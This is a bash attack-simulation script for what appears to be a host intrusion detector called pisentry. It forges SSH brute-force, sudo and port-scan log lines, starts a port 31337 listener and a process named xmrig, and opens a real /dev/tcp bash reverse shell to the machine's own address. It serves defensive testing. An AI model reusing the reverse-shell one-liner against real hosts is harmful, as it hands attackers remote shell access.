#!/usr/bin/env bash
# Safe, self-cleaning attack simulation to prove each pisentry detector works
# on a real host. Nothing leaves the machine: all "attacker" traffic is to the
# host's own LAN address, IPs in log lines are RFC 5737 documentation ranges,
# and every artifact is removed on exit.
#
# Run AFTER the learning period (default 10 min after first start):
#   sudo ./scripts/simulate-attacks.sh
#   sudo pisentry report --since 10m
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root" >&2; exit 1; }

IP="$(hostname -I | awk '{print $1}')"
PIDS=()
cleanup() {
  for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
  rm -f /tmp/xmrig-pisentry-test /etc/cron.d/pisentry-test
  echo "cleaned up"
}
trap cleanup EXIT

step() { printf '\n[%s] %s\n' "$1" "$2"; }

step PS01 "SSH brute force: 8 fake sshd failures from 203.0.113.66"
for i in $(seq 1 8); do
  logger -p auth.info -t sshd "Failed password for root from 203.0.113.66 port 4100$i ssh2"
done

step PS02 "Suspicious login: success from the same source right after"
logger -p auth.info -t sshd "Accepted password for root from 203.0.113.66 port 41999 ssh2"

step PS04 "Privilege escalation: sudo by a user not in sudoers"
logger -p auth.info -t sudo "  mallory : user NOT in sudoers ; TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"

step PS09 "Port scan: 15 firewall drop lines into the kernel log via /dev/kmsg"
for p in 21 22 23 25 53 80 110 143 443 445 3306 3389 5432 6379 8080; do
  echo "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=$IP PROTO=TCP SPT=55555 DPT=$p SYN" > /dev/kmsg
done

step PS07 "Unexpected listener on 0.0.0.0:31337"
python3 -m http.server 31337 --bind 0.0.0.0 >/dev/null 2>&1 &
PIDS+=($!)

step PS06 "Cryptominer: a copy of sleep named xmrig"
cp "$(command -v sleep)" /tmp/xmrig-pisentry-test
/tmp/xmrig-pisentry-test 120 &
PIDS+=($!)

step PS08 "Reverse shell: bash with stdio on a TCP socket to $IP:4445"
python3 -c "
import socket,time
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',4445)); s.listen(1); c,_=s.accept(); time.sleep(120)" &
PIDS+=($!)
sleep 1
bash -c "exec 3<>/dev/tcp/$IP/4445; exec bash -i <&3 >&3 2>&3" >/dev/null 2>&1 &
PIDS+=($!)

step PS05 "Persistence: a harmless comment-only file in /etc/cron.d"
echo "# pisentry simulation, safe to delete" > /etc/cron.d/pisentry-test

echo
echo "waiting 75s so the FIM, listener and proc pollers all run..."
sleep 75
echo
pisentry report --since 10m || true
